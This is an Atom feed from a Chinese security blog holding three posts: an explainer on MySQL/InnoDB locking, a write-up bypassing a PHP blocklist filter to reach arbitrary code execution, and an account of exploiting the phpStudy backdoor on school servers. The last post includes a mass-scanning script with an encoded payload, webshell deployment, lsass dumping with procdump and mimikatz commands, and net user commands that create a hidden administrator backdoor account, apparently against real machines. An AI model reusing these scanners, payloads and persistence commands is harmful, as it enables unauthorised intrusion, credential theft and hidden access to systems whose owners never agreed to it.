<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>一次就好</title>
  
  <subtitle>一次就好</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://black0saturday.github.io/"/>
  <updated>2020-04-22T02:16:41.389Z</updated>
  <id>http://black0saturday.github.io/</id>
  
  <author>
    <name>布布f</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>详解Mysql的锁机制</title>
    <link href="http://black0saturday.github.io/2020/04/22/%E8%AF%A6%E8%A7%A3Mysql%E7%9A%84%E9%94%81%E6%9C%BA%E5%88%B6/"/>
    <id>http://black0saturday.github.io/2020/04/22/详解Mysql的锁机制/</id>
    <published>2020-04-22T01:45:41.000Z</published>
    <updated>2020-04-22T02:16:41.389Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、-MySQL为什么要加锁"><a href="#一、-MySQL为什么要加锁" class="headerlink" title="一、 MySQL为什么要加锁"></a>一、 MySQL为什么要加锁</h2><p>锁机制用于管理对共享资源的并发访问，是对数据库的一种保护机制，也是数据库在事务操作中保证事务数据一致性和完整性的一种机制。当有多个用户并发的去存取数据时，在数据库中就可能会产生多个事务同时去操作一行数据的情况，如果我们不对此类并发操作不加以控制的话，就可能会读取和存储不正确的数据，最终破坏了数据的一致性；下面请看一种典型的并发更新数据所产生的数据丢失更新问题：<br><a id="more"></a></p><pre><code>| 事务A |事务B  ||--|--|| begin A |  |||begin B||select salary form tb where id=1(查询结果为1000)||||select salary form tb where id=1(查询结果为1000)||update tb set salary=1100 where id=1||||update tb set salary=1200 where id=1||commit A||||commit B|</code></pre><p>异常结果：表中salary字段id为1员工的工资更新为了1200，但是实际上针对该员工的工资进行了两次的修改操作，由于事务B在事务A之后提交，所以首先提交的事务A的更新操作被丢失了，所以我们就需要锁机制来保证这种情况不会发生，保证事务中数据的一致性。</p><h2 id="二、-锁类型"><a href="#二、-锁类型" class="headerlink" title="二、 锁类型"></a>二、 锁类型</h2><p><img src="/2020/04/22/%E8%AF%A6%E8%A7%A3Mysql%E7%9A%84%E9%94%81%E6%9C%BA%E5%88%B6/1.png" alt><br>表锁：开销小，加锁快；不会出现死锁；锁定粒度大，发生锁冲突概率高，并发度最低；</p><p>行锁：开销大，加锁慢；会出现死锁；锁定粒度小；发生锁冲突的概率低，并发度高；</p><h2 id="三、-MyISAM存储引擎"><a href="#三、-MyISAM存储引擎" class="headerlink" title="三、 MyISAM存储引擎"></a>三、 MyISAM存储引擎</h2><p><strong>表级锁的锁模式</strong>：表级锁有两种模式：表共享读锁（Table Read Lock）和表独占写锁（Table Write Lock）；对于MyISAM表的读操作，不会阻塞其他用户对同一个表的读请求，但是会阻塞对同一个表的写请求；对MyISAM表的写操作，则会阻塞其他用户对同一个表的读和写操作；MyISAM表的读操作与写操作之间，以及写操作与写操作之间时串行的。</p><p><strong>并发插入（Concurrent Inserts）</strong>：MyISAM表的读和写是串行的，但这是就总体而言的，在一定的条件下，MyISAM表也可以支持查询和插入操作的并发进行；MyISAM存储引擎有一个系统变量concurrent_insert，专门用以控制其并发插入的行为，其值分为可以为0、1/2。当concurrent_insert设置为0时，则不允许并发插入；当concurrent_insert设置为1时，如果MyISAM表中没有空洞（即表的中间没有被删除的行），MyISAM允许在一个进程读表的同时，另一个进程从表尾插入记录，这也是MySQL的默认设置；当concurrent_insert设置为2时，无论MyISAM表中有没有空洞，都允许在表尾并发插入记录。可以利用MyISAM存储引擎此并发插入特性，来解决应用中对同一个表查询和插入的锁争用。例如：将concurrent_insert变量的值设为2，总是允许并发插入操作，同时通过定期在系统空闲时段执行OPTIMIZE TABLE语句来整理空间碎片，回收因删除记录而产生的中间空洞。</p><p><strong>MyISAM引擎的锁调度</strong>：MyISAM存储引擎的读锁和写锁是互斥的，读写操作时串行的。一个进程请求某个MyISAM表的读锁，同时另一个进程也请求同一个表的写锁，写的优先级比读的优先级更高，所以写进程会先获得锁，即使读请求先到锁的等待队列中，写请求后到锁的等待队列中，写锁页回插入到读锁请求之前执行；我们可以通过一些设置来调节MyISAM的调度行为，通过指定启动参数low-priority-updates，使MyISAM引擎默认给予读请求以优先的权利；通过执行命令SET LOW_PRIORITY_UPDATE=1，使该连接发出的更新请求优先级降低；通过指定INSERT、UPDATE、DELETE语句的LOW_PRIORITY属性，降低该语句的优先级。另外，MySQL也提供了一种折中的办法来调节读写冲突，即给系统参数max_write_lock_count设置一个合适的值，当一个表的读锁达到这个值后，MySQL就暂时将写请求的优先级降低，给读进程一定的获得锁的机会。</p><h2 id="四、-InnoDB存储引擎"><a href="#四、-InnoDB存储引擎" class="headerlink" title="四、 InnoDB存储引擎"></a>四、 InnoDB存储引擎</h2><p><img src="/2020/04/22/%E8%AF%A6%E8%A7%A3Mysql%E7%9A%84%E9%94%81%E6%9C%BA%E5%88%B6/1.webp" alt><br>乐观锁与悲观锁是两种并发控制的思想，可用于解决丢失更新的问题：　　　　乐观锁会”乐观的”假定大概率不会发生并发更新冲突，访问、处理数据过程中不加锁，只在更新数据时再根据版本号或时间戳判断是否有冲突，有则处理，无则提交事务；悲观锁会”悲观的”假定大概率会发生并发更新冲突，访问、处理数据前就加排他锁，在整个数据处理过程中锁定数据，事务提交或回滚后才释放锁；</p><p><strong>InnoDB存储引擎标准的行级锁</strong>：共享锁(S Lock)：读锁，允许事务读一行数据；排他锁(X Lock)：写锁，允许事务删除或更新一行数据；<br><img src="/2020/04/22/%E8%AF%A6%E8%A7%A3Mysql%E7%9A%84%E9%94%81%E6%9C%BA%E5%88%B6/2.webp" alt><br><img src="/2020/04/22/%E8%AF%A6%E8%A7%A3Mysql%E7%9A%84%E9%94%81%E6%9C%BA%E5%88%B6/3.webp" alt></p><h2 id="事务1"><a href="#事务1" class="headerlink" title="事务1"></a>事务1</h2><p>MariaDB [test]&gt; show variables  like “autocommit”;<br>+—————+——-+<br>| Variable_name | Value |<br>+—————+——-+<br>| autocommit    | OFF   |<br>+—————+——-+<br>1 row in set (0.00 sec)</p><p>MariaDB [test]&gt; begin;<br>Query OK, 0 rows affected (0.00 sec)</p><p>MariaDB [test]&gt; update tb1  set   name=”aaa”  where id=1;<br>Query OK, 1 row affected (0.00 sec)<br>Rows matched: 1  Changed: 1  Warnings: 0</p><p>MariaDB [test]&gt; commit;<br>Query OK, 0 rows affected (0.00 sec)</p><pre><code>## 事务2：MariaDB [test]&gt; show variables like &quot;autocommit&quot;;+---------------+-------+| Variable_name | Value |+---------------+-------+| autocommit    | OFF   |+---------------+-------+1 row in set (0.00 sec)MariaDB [test]&gt; begin;Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; update tb1  set  name=&quot;haha&quot;  where id=1;Query OK, 1 row affected (12.89 sec)Rows matched: 1  Changed: 1  Warnings: 0MariaDB [test]&gt; rollback;Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; select *   from     tb1 where id=1;+----+------+| id | name |+----+------+|  1 | aaa  |+----+------+1 row in set (0.00 sec)</code></pre><p><strong>InnoDB行锁的实现方式：</strong>InnoDB行锁是通过给索引上的索引项加锁的，InnoDB这种行锁实现特点意味着：只有通过索引条件检索数据，InnoDB才使用行级锁，否则InnoDB将使用表锁。在不通过索引条件查询的时候，InnoDB确实是使用表锁而不是行锁；由于MySQL的行锁是针对索引加的锁，不是针对记录加的锁，所以虽然是访问不同行的记录，但是如果是使用相同的索引键，是会出现锁冲突的；当表有多个索引的时候，不同的事务可以使用不同的索引锁定不同的行，另外，无论是使用主键索引、唯一索引或普通索引，InnoDB都会使用行锁来对数据加锁；即便是在条件中使用了索引字段，但是否使用索引来检索数据是由MySQL通过判断不同执行计划的代价来决定的，如果MySQL认为全表扫描效率更高，比如对一些很小的表，它就不会使用索引，这种情况下InnoDB将使用表锁而不是行锁。</p><p>意向共享锁(IS Lock)：事务想要获得一张表中某几行的共享锁；<br>意向排他锁(IX Lock)：事务想要获得一张表中某几行的排它锁；<br>　<br>　　<br>    MariaDB [test]&gt; show  engine innodb status\G;<br>    MariaDB [test]&gt; show full processlist;<br>    MariaDB [test]&gt; select <em> from information_schema.innodb_trx\G;<br>    <strong><strong><strong><strong><strong><strong>**</strong></strong></strong></strong></strong></strong></em> 1. row <strong><strong><strong><strong><strong><strong>***</strong></strong></strong></strong></strong></strong><br>                        trx_id: 1266629<br>                     trx_state: RUNNING<br>                   trx_started: 2020-01-08 16:24:50<br>         trx_requested_lock_id: NULL<br>              trx_wait_started: NULL<br>                    trx_weight: 0<br>           trx_mysql_thread_id: 36696<br>                     trx_query: select * from information_schema.innodb_trx<br>           trx_operation_state: NULL<br>             trx_tables_in_use: 0<br>             trx_tables_locked: 0<br>              trx_lock_structs: 0<br>         trx_lock_memory_bytes: 376<br>               trx_rows_locked: 0<br>             trx_rows_modified: 0<br>       trx_concurrency_tickets: 0<br>           trx_isolation_level: REPEATABLE READ<br>             trx_unique_checks: 1<br>        trx_foreign_key_checks: 1<br>    trx_last_foreign_key_error: NULL<br>     trx_adaptive_hash_latched: 0<br>     trx_adaptive_hash_timeout: 10000<br>    1 row in set (0.00 sec)</p><p><img src="/2020/04/22/%E8%AF%A6%E8%A7%A3Mysql%E7%9A%84%E9%94%81%E6%9C%BA%E5%88%B6/4.webp" alt></p><pre><code>MariaDB [test]&gt; select * from information_schema.innodb_locks\G;Empty set (0.00 sec)</code></pre><p><img src="/2020/04/22/%E8%AF%A6%E8%A7%A3Mysql%E7%9A%84%E9%94%81%E6%9C%BA%E5%88%B6/5.webp" alt></p><pre><code>MariaDB [test]&gt; select * from information_schema.innodb_lock_waits\G;Empty set (0.00 sec)</code></pre><p><img src="/2020/04/22/%E8%AF%A6%E8%A7%A3Mysql%E7%9A%84%E9%94%81%E6%9C%BA%E5%88%B6/6.webp" alt></p><p><strong>一致性的非锁定读(Consistent Nonlocking Read)</strong>：是指InnoDB存储引擎通过很多个版本控制(multi versioning)的方式来读取当前执行时间数据库中的行的数据。如果读取的行正在执行DELETE或UPDATE操作，这时读取操作不会因此去等待行上的锁的释放；相反，InnoDB存储引擎会去读取行的一个快照数据，快照数据是指该行的之前的版本的数据，该实现是通过undo段来完成的。而undo用来事务中国回滚数据，因此快照数据本身是没有额外的开销。此外，读取快照数据是不需要上锁的，因为没有事务需要对历史数据进行修改操作。然而在不同的事务隔离级别下，对于快照数据，非一致性读总是读取被锁定行的最新一份快照数据，而在REPEATABLE READ事务隔离级别下，对于快照数据，非一致性读总是读取事务开始时的行数据版本。</p><p><img src="/2020/04/22/%E8%AF%A6%E8%A7%A3Mysql%E7%9A%84%E9%94%81%E6%9C%BA%E5%88%B6/7.webp" alt></p><p><strong>一致性的锁定读：</strong>显示地对数据库读取操作进行加锁以保证数据逻辑的一致性；　　SELECT … FOR UPDATE：对读取的行记录加一个X锁，其他事务不能对已锁定的行加任何的锁；　　SELECT … LOCK IN SHARE MODE：对读取的行记录加一个S锁，其他事务可以向被锁定的行加S锁，但是如果加X锁，则会被阻塞；</p><pre><code>## 事务1MariaDB [test]&gt; begin;Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; select  * from   tb1 where id=1 for update;+----+------+| id | name |+----+------+|  1 | aaa  |+----+------+1 row in set (0.00 sec)MariaDB [test]&gt; rollback;Query OK, 0 rows affected (0.00 sec)## 事务2MariaDB [test]&gt; begin;Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; select * from tb1 where id=1 lock in share mode;+----+------+| id | name |+----+------+|  1 | aaa  |+----+------+1 row in set (11.55 sec)MariaDB [test]&gt; rollback;Query OK, 0 rows affected (0.00 sec)</code></pre><p><img src="/2020/04/22/%E8%AF%A6%E8%A7%A3Mysql%E7%9A%84%E9%94%81%E6%9C%BA%E5%88%B6/2.png" alt></p><h2 id="五、死锁"><a href="#五、死锁" class="headerlink" title="五、死锁"></a>五、死锁</h2><p>死锁是指两个或两个以上的事务在执行过程中，因争夺资源而造成的一种互相等待的现象；MyISAM表锁是Deadlock Free的，这时因为MyISAM总是一次获得所需的全部锁，要么全部满足，要么等待，因此不会出现死锁。但在InnoDB中，除单个SQL组成的事务外，锁是逐步获得的，这就决定了在InnoDB中发生死锁是可能的。发生死锁后，InnoDB一般都能自动检测到，并使一个事务释放锁并回退，另外一个事务获得锁，继续完成事务。但在涉及外部锁，或涉及表锁的情况下，InnoDB并不能完全自动检测到死锁，这需要通过设置锁等待超时参数innodb_lock_wait_timeout来解决，需要说明的是，这个参数并不是用来解决死锁问题，在并发访问比较高的情况下，如果大量事务因无法立即获得所需的锁而挂起，会占用大量计算机资源，造成严重性能问题，甚至拖垮数据库。我们通过设置合适的锁等待超时阈值，可以避免这种情况的发生。</p><pre><code>## 事务1MariaDB [test]&gt; begin;Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; update tb1  set   name=&quot;jyy&quot;  where id=1;Query OK, 1 row affected (0.00 sec)Rows matched: 1  Changed: 1  Warnings: 0MariaDB [test]&gt; update tb1  set   name=&quot;xixi&quot;  where id=2;Query OK, 1 row affected (8.25 sec)Rows matched: 1  Changed: 1  Warnings: 0MariaDB [test]&gt; commit;Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; select * from    tb1  where id in(1,2);+----+------+| id | name |+----+------+|  1 | jyy  ||  2 | xixi |+----+------+2 rows in set (0.00 sec)## 事务2MariaDB [test]&gt; begin;Query OK, 0 rows affected (0.00 sec)MariaDB [test]&gt; update tb1  set  name=&quot;haha&quot;  where id=2;Query OK, 1 row affected (0.00 sec)Rows matched: 1  Changed: 1  Warnings: 0MariaDB [test]&gt; update tb1  set  name=&quot;heihei&quot;  where id=1;ERROR 1213 (40001): Deadlock found when trying to get lock; try restarting transaction</code></pre><p>避免死锁的常用方法：</p><ol><li><p>在应用中，如果不同的程序会并发存取多个表，应该尽量约定以相同的顺序来访问表，这样可以大大降低产生死锁的机会。在上面的例子中，由于两个session访问表的顺序不同，发生死锁的机会就非常高，但是如果以相同的顺序来访问，死锁就可以避免；　　</p></li><li><p>在程序以批量方式处理数据的时候，如果事先对数据排序，保证每个线程按固定的顺序来处理记录，也可以大大降低出现死锁的可能；　　</p></li><li><p>在事务中，如果要更新记录，应该直接申请足够级别的锁，即排他锁，而不应该先申请共享锁，从而造成锁冲突，甚至死锁；　　</p></li><li><p>在REPEATABLE-READ隔离级别下，如果两个线程同时对相同条件记录用SELECT…FOR UPDATE加排他锁，在没有符合该条件记录情况下，两个线程都会加锁成功。程序发现记录尚不存在，就试图插入一条记录，如果两个线程都这么做，就会出现死锁，这种情况下，将隔离级别READ COMMITTED就可以避免问题；　　</p></li><li><p>当隔离级别为READ COMMITTED时，如果两个线程都先执行SELECT…FOR UPDATE，判断是否存在符合条件的记录，如果没有，就插入记录。此时，只有一个线程能插入成功，另外一个线程就会出现锁等待，当第一个线程提交后，第二个线程会因为主键冲突出错，但虽然这个线程出错了，却会获得一个排他锁，这时如果有第三个线程又来申请排它锁，也会出现死锁。 </p></li></ol><p>6）如果出现了死锁，可以使用上面的检查锁信息的SQL命令来确定最后一个死锁产生的原因。返回结果中国包括死锁相关的事务的详细信息，如引发死锁的SQL语句，事务已经获得的锁，正在等待什么锁，以及被回滚的事务等。据此可以分析死锁产生的原因和改进措施。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;一、-MySQL为什么要加锁&quot;&gt;&lt;a href=&quot;#一、-MySQL为什么要加锁&quot; class=&quot;headerlink&quot; title=&quot;一、 MySQL为什么要加锁&quot;&gt;&lt;/a&gt;一、 MySQL为什么要加锁&lt;/h2&gt;&lt;p&gt;锁机制用于管理对共享资源的并发访问，是对数据库的一种保护机制，也是数据库在事务操作中保证事务数据一致性和完整性的一种机制。当有多个用户并发的去存取数据时，在数据库中就可能会产生多个事务同时去操作一行数据的情况，如果我们不对此类并发操作不加以控制的话，就可能会读取和存储不正确的数据，最终破坏了数据的一致性；下面请看一种典型的并发更新数据所产生的数据丢失更新问题：&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Mysql" scheme="http://black0saturday.github.io/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>从受限的代码执行到任意代码执行</title>
    <link href="http://black0saturday.github.io/2020/04/21/%E4%BB%8E%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>http://black0saturday.github.io/2020/04/21/从受限的代码执行到任意代码执行/</id>
    <published>2020-04-21T10:09:01.000Z</published>
    <updated>2020-04-21T10:25:44.123Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>发现一个有意思的绕过，写篇文章总结一下<br><a id="more"></a></p><h2 id="受限的代码执行"><a href="#受限的代码执行" class="headerlink" title="受限的代码执行"></a>受限的代码执行</h2><p>如下，一处刺眼的eval代码<br><img src="/2020/04/21/%E4%BB%8E%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.webp" alt><br>这个利用点在信安之路上一篇文章已经有分析到了，所以不做过多流程上的分析，只关注如何 Bypass，完成 RCE。问题的关键是要绕过 danger_key 的处理，具体的代码如下</p><pre><code>//过滤危险字符，保留正常字符function danger_key($s,$type=&apos;&apos;) {  $s=empty($type) ? htmlspecialchars($s) : $s;        $danger=array(&apos;php&apos;,&apos;preg&apos;,&apos;server&apos;,&apos;chr&apos;,&apos;decode&apos;,&apos;html&apos;,&apos;md5&apos;,&apos;post&apos;,&apos;get&apos;,&apos;file&apos;,&apos;cookie&apos;,&apos;session&apos;,&apos;sql&apos;,&apos;del&apos;,&apos;encrypt&apos;,&apos;$&apos;,&apos;system&apos;,&apos;exec&apos;,&apos;shell&apos;,&apos;open&apos;,&apos;ini_&apos;,&apos;chroot&apos;,&apos;eval&apos;,&apos;passthru&apos;,&apos;include&apos;,&apos;require&apos;,&apos;assert&apos;,&apos;union&apos;,&apos;create&apos;,&apos;func&apos;,&apos;symlink&apos;,&apos;sleep&apos;);  $s = str_ireplace($danger,&quot;*&quot;,$s);  $key=array(&apos;php&apos;,&apos;preg&apos;,&apos;decode&apos;,&apos;post&apos;,&apos;get&apos;,&apos;cookie&apos;,&apos;session&apos;,&apos;$&apos;,&apos;exec&apos;,&apos;ascii&apos;,&apos;eval&apos;,&apos;replace&apos;);   foreach ($key as $val){     if(strpos($s,$val) !==false){    error(&apos;很抱歉，执行出错，发现危险字符【&apos;.$val.&apos;】&apos;);    }   }  return $s;}</code></pre><p>比较棘手的是 $type 值写死传入为 1，所以单双引号都会被实体编码，这导致就算我们传入的函数也难以传入一个字符串作为函数参数。再看下面被过滤的函数，虽然过滤了很多常用的函数，但只要是参数类型为 callback 的函数都可以作为绕过的方法。<strong>所以最先需要解决的是如何突破单双引号的限制，完成字符串的传入。</strong></p><h2 id="寻找输入可控的地方"><a href="#寻找输入可控的地方" class="headerlink" title="寻找输入可控的地方"></a>寻找输入可控的地方</h2><h3 id="问题一：-输入点有哪些？"><a href="#问题一：-输入点有哪些？" class="headerlink" title="问题一： 输入点有哪些？"></a>问题一： 输入点有哪些？</h3><p>一开始总是受于思维的限制，老是认为输入点就是 GPC，可真的是这样吗？并非如此，HTTP 传输的数据不只是 GPC，而是整个协议的格式，如下图，除了 GPC 之外，HTTP 头部都是我们可控的。而且这里并不会被过滤函数处理，是理想的控制输入的地方。<br><img src="/2020/04/21/%E4%BB%8E%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/1.png" alt></p><h3 id="问题二：那控制了输入，那如何把控制的输入获取到并传入我们想要执行的函数里呢？"><a href="#问题二：那控制了输入，那如何把控制的输入获取到并传入我们想要执行的函数里呢？" class="headerlink" title="问题二：那控制了输入，那如何把控制的输入获取到并传入我们想要执行的函数里呢？"></a>问题二：那控制了输入，那如何把控制的输入获取到并传入我们想要执行的函数里呢？</h3><p>我已经可以通过上面受限的代码执行来执行一些函数，于是我的思路是寻找一个函数可以返回头部信息，而这个函数的要求是不需要参数。可往往不需要参数的函数返回大多是个数组，不过这没关系，在 PHP5.4 版本就新增支持对函数返回数组的成员访问解析的特性，例如 <code>foo()[0]</code> 。翻了翻手册发现了一个函数满足我的要求。</p><pre><code>getallheaders(PHP 4, PHP 5, PHP 7)getallheaders — 获取全部 HTTP 请求头信息说明getallheaders ( void ) : array</code></pre><p>但我忽略的一个点，get 被替换成 * 所以会导致执行不成功。</p><p><img src="/2020/04/21/%E4%BB%8E%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/2.png" alt></p><p>这个好解决手册的下一句就是</p><pre><code>此函数是 apache_request_headers() 的别名。请阅读 apache_request_headers() 文档获得更多信息。</code></pre><p>所以直接使用 <code>apache_request_headers()</code> 的效果是一样的。</p><h3 id="问题三：apache-request-headers-返回的数组下标为字符串，而-POST-不可以输入字符串怎么办？"><a href="#问题三：apache-request-headers-返回的数组下标为字符串，而-POST-不可以输入字符串怎么办？" class="headerlink" title="问题三：apache_request_headers 返回的数组下标为字符串，而 POST 不可以输入字符串怎么办？"></a>问题三：apache_request_headers 返回的数组下标为字符串，而 POST 不可以输入字符串怎么办？</h3><p>学习一门语言或多或少都会学习数组的切割操作，所以 array_slice 可以切割获得任意一个元素的值。</p><p>到此，我们可以控制输入，同时绕过了过滤，并且把输入作为参数带入到想要执行的函数里。我选了 array_filter 函数来执行任意代码。</p><p>最后的效果就是如下:<br><img src="/2020/04/21/%E4%BB%8E%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%88%B0%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/3.png" alt></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>还是蛮有意思的一个绕过，加深理解了一切输入皆有害！花了一两个小时绕这个，还是蛮有趣的。文章没写太细，更多细节就留给各位调试啦。</p><p>原文链接： <a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247492745&amp;idx=1&amp;sn=e28fbaaaafd592f9e15816ed74262273&amp;chksm=ec1dd4a1db6a5db79e4a79a4f3e0a760a27b8a41cb32be21e50523d0f3191d6f7d592da9e116&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1587437202496&amp;sharer_shareid=843ff91eb1f047718a68377134a06858#rd" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247492745&amp;idx=1&amp;sn=e28fbaaaafd592f9e15816ed74262273&amp;chksm=ec1dd4a1db6a5db79e4a79a4f3e0a760a27b8a41cb32be21e50523d0f3191d6f7d592da9e116&amp;mpshare=1&amp;scene=23&amp;srcid=&amp;sharer_sharetime=1587437202496&amp;sharer_shareid=843ff91eb1f047718a68377134a06858#rd</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;发现一个有意思的绕过，写篇文章总结一下&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="代码执行" scheme="http://black0saturday.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>phpstudy存在后门</title>
    <link href="http://black0saturday.github.io/2020/04/19/phpstudy%E5%90%8E%E9%97%A8%E5%BC%95%E5%8F%91%E6%B8%97%E9%80%8F/"/>
    <id>http://black0saturday.github.io/2020/04/19/phpstudy后门引发渗透/</id>
    <published>2020-04-19T04:41:51.000Z</published>
    <updated>2020-04-20T07:59:39.674Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间 phpstudy 被爆出存在后门，想到学校里的许多站都是用 phpstudy 做的环境，于是写了个脚本扫描了下，发现真的有中招的。<br><a id="more"></a></p><h3 id="phpstudy后门扫描"><a href="#phpstudy后门扫描" class="headerlink" title="phpstudy后门扫描"></a>phpstudy后门扫描</h3><p>写了个简单的脚本</p><pre><code>import requestsimport threading# f = open(&quot;ip.txt&quot;,&apos;w&apos;)def test(ip):    url = &quot;http://{}:80/index.php&quot;.format(ip)    headers = {&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3&quot;, &quot;Accept-Language&quot;: &quot;zh,zh-TW;q=0.9,en-US;q=0.8,en;q=0.7,zh-CN;q=0.6&quot;, &quot;Accept-Charset&quot;: &quot;ZWNobyAiZGFvbGd0cyI7&quot;, &quot;Accept-Encoding&quot;: &quot;gzip,deflate&quot;, &quot;Connection&quot;: &quot;close&quot;}    try:        r = requests.get(url, headers=headers)        if &quot;daolgts&quot; in r.content:            # f.write(ip+&quot;\n&quot;)            print &quot;[+] found\t&quot;+ip        # else:            # print &quot;[-] nope\t&quot;+ip    except:        pass        # print &quot;[-] nope\t&quot;+ipthread=[]for _ in range(1,256):    print &quot;[-] ip :&quot;+_+&quot;next...&quot;    for i in range(1,256):        ip = &quot;192.168.&quot;+str(_)+&quot;.&quot;+str(i)        t=threading.Thread(target=test,args=(ip,))        thread.append(t)        t.start()for x in thread:    t.join()</code></pre><p>最后只有一个 ip 能够利用</p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>根据 payload 可以执行任意的 php 代码</p><p>先 getcwd() 看下位置<br><img src="/2020/04/19/phpstudy%E5%90%8E%E9%97%A8%E5%BC%95%E5%8F%91%E6%B8%97%E9%80%8F/1.webp" alt></p><pre><code>var_dump(getcwd());dmFyX2R1bXAoZ2V0Y3dkKCkpOw==string(12) &quot;C:\phpStudy2&quot;</code></pre><p><br><br>    var_dump(scandir(“C:\phpStudy2”));<br>    var_dump(scandir(“C:\phpStudy2\PHPTutorial”));<br>    var_dump(scandir(“C:\phpStudy2\PHPTutorial\WWW”));</p><p>找到网站目录 C:\phpStudy2\PHPTutorial\WWW</p><p>然后利用 file_put_contents 写个马<br>    </p><p><span style="font-size: 15px; font-family: arial, helvetica, sans-serif;">找到网站目录 </span><code><span style="font-size: 15px; font-family: arial, helvetica, sans-serif;">C:\phpStudy2\PHPTutorial\WWW</span></code></p><p><span style="font-size: 15px; font-family: arial, helvetica, sans-serif;">然后 </span><code><span style="font-size: 15px; font-family: arial, helvetica, sans-serif;">file_put_contents</span></code><span style="font-size: 15px; font-family: arial, helvetica, sans-serif;"> 写个马</span></p><p></p><p>这里使用了蚁剑的插件生成shell，配合蚁剑连接使用<br><img src="/2020/04/19/phpstudy%E5%90%8E%E9%97%A8%E5%BC%95%E5%8F%91%E6%B8%97%E9%80%8F/2.webp" alt><br><img src="/2020/04/19/phpstudy%E5%90%8E%E9%97%A8%E5%BC%95%E5%8F%91%E6%B8%97%E9%80%8F/3.webp" alt></p><p>成功连接<br><img src="/2020/04/19/phpstudy%E5%90%8E%E9%97%A8%E5%BC%95%E5%8F%91%E6%B8%97%E9%80%8F/4.webp" alt><br>emmm，直接就是 administrator 了，也没有内网环境，后来发现是一台虚拟机，枯燥。。</p><p>看下端口<br><img src="/2020/04/19/phpstudy%E5%90%8E%E9%97%A8%E5%BC%95%E5%8F%91%E6%B8%97%E9%80%8F/5.webp" alt></p><p>发现开启了 3306 和 9833，3306 是 mysql ，这个 9833 应该就是修改了的 3389 的端口mysql 的密码在 config.php 中能找到，而且是 root 用户</p><p>使用蚁剑连接，在数据库中发现网站后台的管理员密码<br><img src="/2020/04/19/phpstudy%E5%90%8E%E9%97%A8%E5%BC%95%E5%8F%91%E6%B8%97%E9%80%8F/6.webp" alt></p><p>然后目标转向 9983<br>kali 下使用 rdesktop 有问题<br><img src="/2020/04/19/phpstudy%E5%90%8E%E9%97%A8%E5%BC%95%E5%8F%91%E6%B8%97%E9%80%8F/7.webp" alt><br>windows 里 mstsc.exe 可以正常连接</p><p>然后抓下密码，先传个 procdump64.exe，执行</p><pre><code>procdump64.exe -accepteula -ma lsass.exe 1.dmp</code></pre><p>得到 1.dmp ，使用 mimikatz.exe 读</p><pre><code>sekurlsa::minidump lsass.dmpsekurlsa::logonPasswords full</code></pre><p><img src="/2020/04/19/phpstudy%E5%90%8E%E9%97%A8%E5%BC%95%E5%8F%91%E6%B8%97%E9%80%8F/8.webp" alt></p><p>emmm，不知道为什么抓不到密码，也尝试了传 mimikatz.exe 直接读，同样失败</p><ol><li><p>既然已经拿到了 administrator 权限，直接添加一个后门用户吧</p><p> net user defaultuser0$ somepasswordhere /add /y<br> net localgroup administrators defaultuser0$ /add<br> net localgroup “remote desktop users” defaultuser0$ /add</p></li></ol><p>使用该账号密码，成功登录</p><p>用户名后添加 $ 在 cmd 里使用 net user 查看时是可以隐藏的，但在图形界面下还是会显示</p><ol 